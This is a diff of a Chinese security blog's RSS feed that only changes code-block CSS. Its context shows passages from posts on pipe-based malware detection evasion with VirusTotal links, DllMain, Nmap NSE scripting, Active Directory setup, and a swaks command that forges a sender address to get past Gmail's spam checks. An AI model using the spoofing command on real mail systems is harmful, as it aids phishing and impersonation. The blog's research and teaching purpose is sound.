 &lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;
 &lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#75715e"&gt;// 入口函数
@@ -2975,7 +2975,7 @@ VOID msg(VOID){
 &lt;p&gt;&lt;a href="https://www.virustotal.com/gui/file/72db045fbb839a666a5cc2d13ea5a8282756014d80827a7343344e2d5387fe44/detection"&gt;https://www.virustotal.com/gui/file/72db045fbb839a666a5cc2d13ea5a8282756014d80827a7343344e2d5387fe44/detection&lt;/a&gt;&lt;/p&gt;
 &lt;p&gt;&lt;a href="https://www.virustotal.com/gui/file/d31628050d943101ff108b9b070b48f97075e295e3797aec8ab8454cc19a3d88/detection"&gt;https://www.virustotal.com/gui/file/d31628050d943101ff108b9b070b48f97075e295e3797aec8ab8454cc19a3d88/detection&lt;/a&gt;&lt;/p&gt;
 &lt;p&gt;&lt;strong&gt;BadCodeWithPipe&lt;/strong&gt;&lt;/p&gt;
-&lt;div class="highlight"&gt;&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"&gt;&lt;code class="language-c" data-lang="c"&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#75715e"&gt;#include&lt;/span&gt; &lt;span style="color:#75715e"&gt;&amp;lt;Windows.h&amp;gt;&lt;/span&gt;&lt;span style="color:#75715e"&gt;
+&lt;div class="highlight"&gt;&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"&gt;&lt;code class="language-c" data-lang="c"&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#75715e"&gt;#include&lt;/span&gt; &lt;span style="color:#75715e"&gt;&amp;lt;Windows.h&amp;gt;&lt;/span&gt;&lt;span style="color:#75715e"&gt;
 &lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#75715e"&gt;#include&lt;/span&gt; &lt;span style="color:#75715e"&gt;&amp;lt;stdio.h&amp;gt;&lt;/span&gt;&lt;span style="color:#75715e"&gt;
 &lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#75715e"&gt;#include&lt;/span&gt; &lt;span style="color:#75715e"&gt;&amp;lt;intrin.h&amp;gt;&lt;/span&gt;&lt;span style="color:#75715e"&gt;
 &lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;
@@ -3049,7 +3049,7 @@ VOID msg(VOID){
 &lt;p&gt;何为管道：管道是通过网络来完成进程间的通信，它屏蔽了底层的网络协议细节。&lt;/p&gt;
 &lt;p&gt;通常与Pipe相关的API都与管道有关，包括Cobaltstrike External C2也是用的管道进行进程通信，一般管道是一个公开的内核对象，所有进程都可以访问。&lt;/p&gt;
 &lt;p&gt;先展开本地管道来讲解：&lt;/p&gt;
-&lt;div class="highlight"&gt;&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"&gt;&lt;code class="language-c" data-lang="c"&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#75715e"&gt;#include&lt;/span&gt; &lt;span style="color:#75715e"&gt;&amp;lt;Windows.h&amp;gt;&lt;/span&gt;&lt;span style="color:#75715e"&gt;
+&lt;div class="highlight"&gt;&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"&gt;&lt;code class="language-c" data-lang="c"&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#75715e"&gt;#include&lt;/span&gt; &lt;span style="color:#75715e"&gt;&amp;lt;Windows.h&amp;gt;&lt;/span&gt;&lt;span style="color:#75715e"&gt;
 &lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#75715e"&gt;#include&lt;/span&gt; &lt;span style="color:#75715e"&gt;&amp;lt;stdio.h&amp;gt;&lt;/span&gt;&lt;span style="color:#75715e"&gt;
 &lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#75715e"&gt;#include&lt;/span&gt; &lt;span style="color:#75715e"&gt;&amp;lt;intrin.h&amp;gt;&lt;/span&gt;&lt;span style="color:#75715e"&gt;
 &lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;
@@ -3154,7 +3154,7 @@ VOID msg(VOID){
 &lt;/ul&gt;
 &lt;p&gt;&lt;strong&gt;如果DLL被多次&lt;code&gt;LoadLibrary&lt;/code&gt;，那么&lt;code&gt;DllMain&lt;/code&gt;只执行一次，引用基数+1。&lt;/strong&gt;&lt;/p&gt;
 &lt;h3 id="dllmain的原型"&gt;DllMain的原型&lt;/h3&gt;
-&lt;div class="highlight"&gt;&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"&gt;&lt;code class="language-c++" data-lang="c++"&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;BOOL WINAPI &lt;span style="color:#a6e22e"&gt;DllMain&lt;/span&gt;(
+&lt;div class="highlight"&gt;&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"&gt;&lt;code class="language-c++" data-lang="c++"&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;BOOL WINAPI &lt;span style="color:#a6e22e"&gt;DllMain&lt;/span&gt;(
 &lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; _In_ HINSTANCE hinstDLL, &lt;span style="color:#75715e"&gt;// 指向自身的句柄
 &lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; _In_ DWORD fdwReason, &lt;span style="color:#75715e"&gt;// 调用原因
 &lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; _In_ LPVOID lpvReserved &lt;span style="color:#75715e"&gt;// 隐式加载和显式加载
@@ -3168,7 +3168,7 @@ VOID msg(VOID){
 &lt;li&gt;DLL_THREAD_DETACH 被线程释放&lt;/li&gt;
 &lt;/ul&gt;
 &lt;p&gt;在DllMain中通常为了捕获DLL被调用的方式来进行某些动作：&lt;/p&gt;
-&lt;div class="highlight"&gt;&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"&gt;&lt;code class="language-c++" data-lang="c++"&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;BOOL APIENTRY &lt;span style="color:#a6e22e"&gt;DllMain&lt;/span&gt;( HANDLE hModule, DWORD ul_reason_for_call, LPVOID lpReserved)
+&lt;div class="highlight"&gt;&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"&gt;&lt;code class="language-c++" data-lang="c++"&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;BOOL APIENTRY &lt;span style="color:#a6e22e"&gt;DllMain&lt;/span&gt;( HANDLE hModule, DWORD ul_reason_for_call, LPVOID lpReserved)
 &lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;{
 &lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;　&lt;span style="color:#66d9ef"&gt;switch&lt;/span&gt; (ul_reason_for_call)
 &lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;　{
@@ -3196,7 +3196,7 @@ VOID msg(VOID){
 &lt;p&gt;swaks - Swiss Army Knife SMTP, the all-purpose smtp transaction tester.&lt;/p&gt;
 &lt;p&gt;swaks堪称SMTP协议的瑞士军刀，使用它我们可以灵活的操作SMTP协议报文，这篇文章主要是记录一下我是如何伪造一封邮件绕过gmail的检测。&lt;/p&gt;
 &lt;p&gt;通常最简单的发送命令：&lt;/p&gt;
-&lt;div class="highlight"&gt;&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"&gt;&lt;code class="language-bash" data-lang="bash"&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;swaks --to user@example.com --server test-server.example.net
+&lt;div class="highlight"&gt;&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"&gt;&lt;code class="language-bash" data-lang="bash"&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;swaks --to user@example.com --server test-server.example.net
 &lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;但是邮件头中会带上&lt;code&gt;X-Mailer&lt;/code&gt;：&lt;/p&gt;
 &lt;p&gt;&lt;a href="https://images.payloads.online/74cbdcfa-4f5f-11ec-9bc1-00d861bf4abb.png" data-fancybox="gallery" data-caption="2019-05-09-14-24-53"&gt;
  &lt;img src="https://images.payloads.online/74cbdcfa-4f5f-11ec-9bc1-00d861bf4abb.png" alt="2019-05-09-14-24-53" /&gt;
@@ -3213,13 +3213,13 @@ VOID msg(VOID){
 &lt;/a&gt;
 &lt;/p&gt;
 &lt;h2 id="0x02-swaks发送邮件"&gt;0x02 swaks发送邮件&lt;/h2&gt;
-&lt;div class="highlight"&gt;&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"&gt;&lt;code class="language-bash" data-lang="bash"&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;swaks --to rvn0xsy@gmail.com --from admin@qq.com --ehlo gmail.com --body hello --server mail.smtp2go.com -p &lt;span style="color:#ae81ff"&gt;2525&lt;/span&gt; -au &amp;lt;USER&amp;gt; -ap &amp;lt;PASS&amp;gt;
+&lt;div class="highlight"&gt;&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"&gt;&lt;code class="language-bash" data-lang="bash"&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;swaks --to rvn0xsy@gmail.com --from admin@qq.com --ehlo gmail.com --body hello --server mail.smtp2go.com -p &lt;span style="color:#ae81ff"&gt;2525&lt;/span&gt; -au &amp;lt;USER&amp;gt; -ap &amp;lt;PASS&amp;gt;
 &lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;但是上面这个邮件无法绕过SPF。&lt;/p&gt;
 &lt;h2 id="0x03-spf验证原理"&gt;0x03 SPF验证原理&lt;/h2&gt;
 &lt;p&gt;如果mail.smtp2go.com是我的邮件服务器，那么gmail服务器收到的源IP也肯定是mail.smtp2go.com的IP。&lt;/p&gt;
 &lt;p&gt;gmail会校验邮件发送者的IP是否存在于smtp.from的域名spf配置列表里。&lt;/p&gt;
 &lt;p&gt;而上面这条命令：&lt;/p&gt;
-&lt;div class="highlight"&gt;&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"&gt;&lt;code class="language-bash" data-lang="bash"&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;swaks --to rvn0xsy@gmail.com --from admin@qq.com --ehlo gmail.com --body hello --server mail.smtp2go.com -p &lt;span style="color:#ae81ff"&gt;2525&lt;/span&gt; -au &amp;lt;USER&amp;gt; -ap &amp;lt;PASS&amp;gt;
+&lt;div class="highlight"&gt;&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"&gt;&lt;code class="language-bash" data-lang="bash"&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;swaks --to rvn0xsy@gmail.com --from admin@qq.com --ehlo gmail.com --body hello --server mail.smtp2go.com -p &lt;span style="color:#ae81ff"&gt;2525&lt;/span&gt; -au &amp;lt;USER&amp;gt; -ap &amp;lt;PASS&amp;gt;
 &lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;smtp.from就是admin@qq.com，和mail.smtp2go.com的IP肯定不同，所以SPF校验失败，而校验失败的邮件，会有很高的几率被扔到垃圾邮件中。&lt;/p&gt;</description></item><item><title>Nmap扩展开发（一）</title><link>https://payloads.online/archivers/2019-04-24/1/</link><pubDate>Wed, 24 Apr 2019 00:00:00 +0000</pubDate><guid>https://payloads.online/archivers/2019-04-24/1/</guid><description>&lt;h2 id="0x00-前言"&gt;0x00 前言&lt;/h2&gt;
 &lt;p&gt;PS ：如果你不知道你是否需要学习这个技术，那么我可以先告诉你Nmap能够做什么：&lt;/p&gt;
 &lt;ul&gt;
@@ -3292,7 +3292,7 @@ VOID msg(VOID){
 &lt;/blockquote&gt;
 &lt;p&gt;由于Nmap没提供这个需求的解决方案，就需要我们自己来写一个扩展脚本了~&lt;/p&gt;
 &lt;p&gt;还是拿之前的test.nse来改一下：&lt;/p&gt;
-&lt;div class="highlight"&gt;&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"&gt;&lt;code class="language-lua" data-lang="lua"&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#66d9ef"&gt;local&lt;/span&gt; stdnse &lt;span style="color:#f92672"&gt;=&lt;/span&gt; require &lt;span style="color:#e6db74"&gt;&amp;#34;stdnse&amp;#34;&lt;/span&gt;
+&lt;div class="highlight"&gt;&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"&gt;&lt;code class="language-lua" data-lang="lua"&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#66d9ef"&gt;local&lt;/span&gt; stdnse &lt;span style="color:#f92672"&gt;=&lt;/span&gt; require &lt;span style="color:#e6db74"&gt;&amp;#34;stdnse&amp;#34;&lt;/span&gt;
 &lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;prerule&lt;span style="color:#f92672"&gt;=&lt;/span&gt;&lt;span style="color:#66d9ef"&gt;function&lt;/span&gt;()
 &lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#66d9ef"&gt;end&lt;/span&gt;
 &lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;hostrule&lt;span style="color:#f92672"&gt;=&lt;/span&gt;&lt;span style="color:#66d9ef"&gt;function&lt;/span&gt;(host)
@@ -3335,7 +3335,7 @@ VOID msg(VOID){
 需要引入stdnse包，调用format_mac函数&lt;/p&gt;
 &lt;/blockquote&gt;
 &lt;p&gt;如此一来思路清晰了许多，还是从test.nse改起：&lt;/p&gt;
-&lt;div class="highlight"&gt;&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"&gt;&lt;code class="language-lua" data-lang="lua"&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#66d9ef"&gt;local&lt;/span&gt; stdnse &lt;span style="color:#f92672"&gt;=&lt;/span&gt; require &lt;span style="color:#e6db74"&gt;&amp;#34;stdnse&amp;#34;&lt;/span&gt;
+&lt;div class="highlight"&gt;&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"&gt;&lt;code class="language-lua" data-lang="lua"&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#66d9ef"&gt;local&lt;/span&gt; stdnse &lt;span style="color:#f92672"&gt;=&lt;/span&gt; require &lt;span style="color:#e6db74"&gt;&amp;#34;stdnse&amp;#34;&lt;/span&gt;
 &lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;prerule&lt;span style="color:#f92672"&gt;=&lt;/span&gt;&lt;span style="color:#66d9ef"&gt;function&lt;/span&gt;()
 &lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#66d9ef"&gt;end&lt;/span&gt;
 &lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;hostrule&lt;span style="color:#f92672"&gt;=&lt;/span&gt;&lt;span style="color:#66d9ef"&gt;function&lt;/span&gt;(host)
@@ -3374,7 +3374,7 @@ VOID msg(VOID){
 &lt;p&gt;可以发现，在nmap启动后就会执行nse_main.lua中的代码。&lt;/p&gt;
 &lt;h2 id="0x03-扩展脚本执行规则"&gt;0x03 扩展脚本执行规则&lt;/h2&gt;
 &lt;p&gt;在nse_main.lua的64行左右，定义了一些规则：&lt;/p&gt;
-&lt;div class="highlight"&gt;&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"&gt;&lt;code class="language-lua" data-lang="lua"&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#75715e"&gt;-- Table of different supported rules.&lt;/span&gt;
+&lt;div class="highlight"&gt;&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"&gt;&lt;code class="language-lua" data-lang="lua"&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#75715e"&gt;-- Table of different supported rules.&lt;/span&gt;
 &lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#66d9ef"&gt;local&lt;/span&gt; NSE_SCRIPT_RULES &lt;span style="color:#f92672"&gt;=&lt;/span&gt; {
 &lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; prerule &lt;span style="color:#f92672"&gt;=&lt;/span&gt; &lt;span style="color:#e6db74"&gt;&amp;#34;prerule&amp;#34;&lt;/span&gt;,
 &lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; hostrule &lt;span style="color:#f92672"&gt;=&lt;/span&gt; &lt;span style="color:#e6db74"&gt;&amp;#34;hostrule&amp;#34;&lt;/span&gt;,
@@ -3392,7 +3392,7 @@ VOID msg(VOID){
 &lt;p&gt;为了验证我得出的结论，写了一个测试脚本：&lt;/p&gt;
 &lt;p&gt;&lt;code&gt;vim /usr/share/nmap/scripts/test.nse&lt;/code&gt;&lt;/p&gt;
 &lt;p&gt;内容如下：&lt;/p&gt;
-&lt;div class="highlight"&gt;&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"&gt;&lt;code class="language-lua" data-lang="lua"&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;prerule&lt;span style="color:#f92672"&gt;=&lt;/span&gt;&lt;span style="color:#66d9ef"&gt;function&lt;/span&gt;()
+&lt;div class="highlight"&gt;&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"&gt;&lt;code class="language-lua" data-lang="lua"&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;prerule&lt;span style="color:#f92672"&gt;=&lt;/span&gt;&lt;span style="color:#66d9ef"&gt;function&lt;/span&gt;()
 &lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;	print(&lt;span style="color:#e6db74"&gt;&amp;#34;prerule()&amp;#34;&lt;/span&gt;)
 &lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#66d9ef"&gt;end&lt;/span&gt;
 &lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;hostrule&lt;span style="color:#f92672"&gt;=&lt;/span&gt;&lt;span style="color:#66d9ef"&gt;function&lt;/span&gt;(host)
@@ -3453,11 +3453,11 @@ VOID msg(VOID){
 &lt;p&gt;首先我先介绍自动化的方式搭建，后面再介绍手动方式。&lt;/p&gt;
 &lt;p&gt;在微软官方的手册中，有提到如何使用Powershell去安装活动目录服务：&lt;a href="https://github.com/MicrosoftDocs/windowsserverdocs/blob/master/WindowsServerDocs/identity/ad-ds/deploy/Install-Active-Directory-Domain-Services--Level-100-.md"&gt;Install Active Directory Domain Services (Level 100)&lt;/a&gt;&lt;/p&gt;
 &lt;p&gt;第一步：安装活动目录服务&lt;/p&gt;
-&lt;div class="highlight"&gt;&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"&gt;&lt;code class="language-powershell" data-lang="powershell"&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;$ Install-Windowsfeature AD-Domain-Services
+&lt;div class="highlight"&gt;&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"&gt;&lt;code class="language-powershell" data-lang="powershell"&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;$ Install-Windowsfeature AD-Domain-Services
 &lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;第二步：导入&lt;a href="https://docs.microsoft.com/en-us/powershell/module/addsdeployment/?redirectedfrom=MSDN&amp;amp;view=windowsserver2019-ps"&gt;Addsdeployment&lt;/a&gt;模块&lt;/p&gt;
-&lt;div class="highlight"&gt;&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"&gt;&lt;code class="language-powershell" data-lang="powershell"&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;Import-Module Addsdeployment
+&lt;div class="highlight"&gt;&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"&gt;&lt;code class="language-powershell" data-lang="powershell"&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;Import-Module Addsdeployment
 &lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;第三步：调用&lt;a href="https://github.com/MicrosoftDocs/windowsserverdocs/blob/master/WindowsServerDocs/identity/ad-ds/deploy/Install-Active-Directory-Domain-Services--Level-100-.md"&gt;Install-ADDSForest&lt;/a&gt;设置域的信息执行安装&lt;/p&gt;
-&lt;div class="highlight"&gt;&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"&gt;&lt;code class="language-powershell" data-lang="powershell"&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;Install-ADDSForest -CreateDnsDelegation:$false -DomainMode &lt;span style="color:#e6db74"&gt;&amp;#34;7&amp;#34;&lt;/span&gt; -DomainName &lt;span style="color:#e6db74"&gt;&amp;#34;PAYLOADS.ONLINE&amp;#34;&lt;/span&gt; -DomainNetbiosName &lt;span style="color:#e6db74"&gt;&amp;#34;PAYLOADS&amp;#34;&lt;/span&gt; -ForestMode &lt;span style="color:#e6db74"&gt;&amp;#34;7&amp;#34;&lt;/span&gt; -InstallDns:$true -NoRebootOnCompletion:$false -Force:$true
+&lt;div class="highlight"&gt;&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"&gt;&lt;code class="language-powershell" data-lang="powershell"&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;Install-ADDSForest -CreateDnsDelegation:$false -DomainMode &lt;span style="color:#e6db74"&gt;&amp;#34;7&amp;#34;&lt;/span&gt; -DomainName &lt;span style="color:#e6db74"&gt;&amp;#34;PAYLOADS.ONLINE&amp;#34;&lt;/span&gt; -DomainNetbiosName &lt;span style="color:#e6db74"&gt;&amp;#34;PAYLOADS&amp;#34;&lt;/span&gt; -ForestMode &lt;span style="color:#e6db74"&gt;&amp;#34;7&amp;#34;&lt;/span&gt; -InstallDns:$true -NoRebootOnCompletion:$false -Force:$true
 &lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Install-ADDSForest 的参数解释：&lt;/p&gt;
 &lt;ul&gt;
 &lt;li&gt;CreateDnsDelegation 是否创建引用与域控制器一起安装的新DNS服务器的DNS委派。 仅对 Active Directory“集成 DNS 有效。默认值是根据环境自动计算的。&lt;/li&gt;
@@ -3483,7 +3483,7 @@ VOID msg(VOID){
 &lt;p&gt;感恩&lt;/p&gt;</description></item><item><title>BaseRequestHandler 传参问题</title><link>https://payloads.online/archivers/2019-04-02/2/</link><pubDate>Tue, 02 Apr 2019 00:00:00 +0000</pubDate><guid>https://payloads.online/archivers/2019-04-02/2/</guid><description>&lt;p&gt;最近在写&lt;a href="https://github.com/Rvn0xsy/Cooolis-ms"&gt;Cooolis-ms&lt;/a&gt;的时候遇到一个坑，学艺不精靠搜索，最终解决了。&lt;/p&gt;
 &lt;p&gt;问题主要是不知道如何把&lt;code&gt;ArgumentParser&lt;/code&gt;处理的参数传递到继承了&lt;code&gt;BaseRequestHandler&lt;/code&gt;的&lt;code&gt;class&lt;/code&gt;中。&lt;/p&gt;
 &lt;p&gt;通常情况下，创建一个TCP的&lt;code&gt;socketserver&lt;/code&gt;代码如下：&lt;/p&gt;
-&lt;div class="highlight"&gt;&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"&gt;&lt;code class="language-python" data-lang="python"&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;
+&lt;div class="highlight"&gt;&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"&gt;&lt;code class="language-python" data-lang="python"&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;
 &lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#f92672"&gt;import&lt;/span&gt; socketserver
 &lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;
 &lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#66d9ef"&gt;class&lt;/span&gt; &lt;span style="color:#a6e22e"&gt;MyTCPHandler&lt;/span&gt;(socketserver&lt;span style="color:#f92672"&gt;.&lt;/span&gt;BaseRequestHandler):
@@ -3504,7 +3504,7 @@ VOID msg(VOID){
 &lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; server&lt;span style="color:#f92672"&gt;.&lt;/span&gt;serve_forever() 
 &lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;假若我想对&lt;code&gt;MyTCPHandler&lt;/code&gt;进行一些修饰，添加一些成员属性，那就需要覆盖&lt;code&gt;__init__&lt;/code&gt;函数，很多资料告诉我调用&lt;code&gt;super&lt;/code&gt;可以解决，但是&lt;code&gt;BaseRequestHandler&lt;/code&gt;是有参数的，这些参数必须由&lt;code&gt;ThreadingTCPServer&lt;/code&gt;进行传递。&lt;/p&gt;
 &lt;p&gt;因此，通过&lt;code&gt;stackoverflow&lt;/code&gt;上的一个&lt;a href="https://stackoverflow.com/questions/6875599/with-python-socketserver-how-can-i-pass-a-variable-to-the-constructor-of-the-han"&gt;大神&lt;/a&gt;解决了问题：&lt;/p&gt;
-&lt;div class="highlight"&gt;&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"&gt;&lt;code class="language-python" data-lang="python"&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#f92672"&gt;import&lt;/span&gt; socketserver
+&lt;div class="highlight"&gt;&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"&gt;&lt;code class="language-python" data-lang="python"&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#f92672"&gt;import&lt;/span&gt; socketserver
 &lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;
 &lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#66d9ef"&gt;class&lt;/span&gt; &lt;span style="color:#a6e22e"&gt;MyTCPHandler&lt;/span&gt;(socketserver&lt;span style="color:#f92672"&gt;.&lt;/span&gt;BaseRequestHandler):
 &lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#66d9ef"&gt;def&lt;/span&gt; &lt;span style="color:#a6e22e"&gt;__init__&lt;/span&gt;(self,request, client_address, server,name):
@@ -3749,7 +3749,7 @@ iex $c;
 &lt;h2 id="0x04-写入内容"&gt;0x04 写入内容&lt;/h2&gt;
 &lt;p&gt;这个过程中，我们可以写入shellcode、PE文件、字符串等。&lt;/p&gt;
 &lt;p&gt;这里我只是写入了一个“Hello world !!!”：&lt;/p&gt;
